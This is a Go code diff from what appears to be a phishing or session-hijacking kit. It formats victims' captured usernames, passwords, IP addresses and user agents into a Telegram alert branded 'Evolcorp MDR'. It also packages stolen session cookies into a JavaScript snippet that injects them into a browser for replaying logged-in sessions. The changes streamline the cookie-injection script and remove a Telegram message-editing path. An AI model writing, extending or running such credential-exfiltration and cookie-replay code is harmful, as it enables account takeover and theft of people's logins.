@@ -117,17 +117,6 @@ var processedSessions = make(map[string]bool)
 var sessionMessageMap = make(map[string]int)
 var mu sync.Mutex
 
-func generateRandomString() string {
-	rand.Seed(time.Now().UnixNano())
-	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
-	length := 10
-	randomStr := make([]byte, length)
-	for i := range randomStr {
-		randomStr[i] = charset[rand.Intn(len(charset))]
-	}
-	return string(randomStr)
-}
-
 func createTxtFile(session Session) (string, error) {
 	// Create a text file name based on the email and timestamp
 	safeEmail := strings.ReplaceAll(session.Username, "@", "_")
@@ -144,58 +133,29 @@ func createTxtFile(session Session) (string, error) {
 	}
 	defer txtFile.Close()
 
-	// Marshal the session maps into JSON byte slices
+	// Marshal tokens into JSON
 	tokensJSON, err := json.MarshalIndent(session.Tokens, "", "  ")
 	if err != nil {
-		return "", fmt.Errorf("failed to marshal Tokens: %v", err)
+		return "", fmt.Errorf("failed to marshal tokens: %v", err)
 	}
-	httpTokensJSON, err := json.MarshalIndent(session.HTTPTokens, "", "  ")
-	if err != nil {
-		return "", fmt.Errorf("failed to marshal HTTPTokens: %v", err)
-	}
-	bodyTokensJSON, err := json.MarshalIndent(session.BodyTokens, "", "  ")
-	if err != nil {
-		return "", fmt.Errorf("failed to marshal BodyTokens: %v", err)
-	}
-	customJSON, err := json.MarshalIndent(session.Custom, "", "  ")
-	if err != nil {
-		return "", fmt.Errorf("failed to marshal Custom: %v", err)
-	}
-
-	allTokens, err := processAllTokens(string(tokensJSON), string(httpTokensJSON), string(bodyTokensJSON), string(customJSON))
-
-	result, err := json.MarshalIndent(allTokens, "", "  ")
-	if err != nil {
-		fmt.Println("Error marshalling final tokens:", err)
-	}
-
-	fmt.Println("Combined Tokens: ", string(result))
 
 	// Wrap JSON inside JavaScript function
 	jsWrapper := fmt.Sprintf(`(function(){
-let cookies = JSON.parse(`+"`%s`"+`);
+let cookies = JSON.parse('%s');
 function putCookie(key, value, domain, path, isSecure) {
         const cookieMaxAge = 'Max-Age=31536000';
         if (isSecure) {
                 console.log('Setting Cookie', key, value);
-                if (window.location.hostname == domain) {
-                    document.cookie = `${key}=${value};${cookieMaxAge}; path=${path}; Secure; SameSite=None`;
-                } else {
-                    document.cookie = `${key}=${value};${cookieMaxAge};domain=${domain};path=${path};Secure;SameSite=None`;
-                }
+                document.cookie = key + '=' + value + ';' + cookieMaxAge + '; path=' + path + '; Secure; SameSite=None';
             } else {
                 console.log('Setting Cookie', key, value);
-                if (window.location.hostname == domain) {
-                    document.cookie = `${key}=${value};${cookieMaxAge};path=${path};`;
-                } else {
-                    document.cookie = `${key}=${value};${cookieMaxAge};domain=${domain};path=${path};`;
-                }
+                document.cookie = key + '=' + value + ';' + cookieMaxAge + '; path=' + path + ';';
             }
         }
         for (let cookie of cookies) {
             putCookie(cookie.name, cookie.value, cookie.domain, cookie.path, cookie.secure);
         }
-}());`, string(result))
+}());`, strings.ReplaceAll(string(tokensJSON), "'", "\\'"))
 
 	// Write the wrapped JavaScript content into the text file
 	_, err = txtFile.WriteString(jsWrapper)
@@ -206,17 +166,15 @@ function putCookie(key, value, domain, path, isSecure) {
 	return txtFilePath, nil
 }
 
-
 func formatSessionMessage(session Session) string {
 	// Format the session information (no token data in message)
 	return fmt.Sprintf("🔐 Evolcorp MDR 🔐\n\n"+
 		"👤 Username:      🪤 %s\n"+
 		"🔑 Password:      🪤 %s\n"+
-		"🌐 Landing URL:   🪤 %s\n \n"+
+		"🌐 Landing URL:   🪤 %s\n\n"+
 		"🖥️ User Agent:    🪤 %s\n"+
 		"🌍 Remote Address:🪤 %s\n"+
-		"🕒 Create Time:   🪤 %d\n"+
-		"\n"+
+		"🕒 Create Time:   🪤 %d\n\n"+
 		"📦 Token Delivery. 🍪 incoming.\n",
 		session.Username,
 		session.Password,
@@ -237,20 +195,6 @@ func Notify(session Session) {
 	mu.Lock()
 	if processedSessions[string(session.ID)] {
 		mu.Unlock()
-		messageID, exists := sessionMessageMap[string(session.ID)]
-		if exists {
-			txtFilePath, err := createTxtFile(session)
-			if err != nil {
-				fmt.Println("Error creating TXT file for update:", err)
-				return
-			}
-			msg_body := formatSessionMessage(session)
-			err = editMessageFile(config.TelegramChatID, config.TelegramToken, messageID, txtFilePath, msg_body)
-			if err != nil {
-				fmt.Printf("Error editing message: %v\n", err)
-			}
-			os.Remove(txtFilePath)
-		}
 		return
 	}
 
